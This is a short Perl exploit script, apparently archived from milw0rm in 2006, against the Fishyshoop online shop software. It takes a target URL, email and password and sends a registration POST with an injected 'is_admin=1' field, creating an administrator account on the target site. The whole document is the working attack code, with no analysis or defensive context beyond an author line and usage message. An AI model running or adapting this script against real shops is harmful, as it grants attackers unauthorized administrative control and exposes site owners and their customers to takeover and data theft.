#!/usr/bin/perl
# James Gray <james6.0[@]gmail.com>
# Fishyshoop Security Vulnerability

use WWW::Curl::Easy;

sub usage() {
 print "$0 <Fishyshoop root URL> <Desired E-Mail> <Desired Password>\n";
 exit();
}

$FSURL=shift or usage(); $UNAME=shift or usage(); $PASS=shift or usage();

my $fishyshoop = new WWW::Curl::Easy;
$fishyshoop->setopt(CURLOPT_URL, "$FSURL?L=register.register");
$fishyshoop->setopt(CURLOPT_POST, 1);
$fishyshoop->setopt(CURLOPT_POSTFIELDS, "email=$UNAME&password=$PASS&is_admin=1&submit=1");
$fishyshoop->perform;

# milw0rm.com [2006-12-25]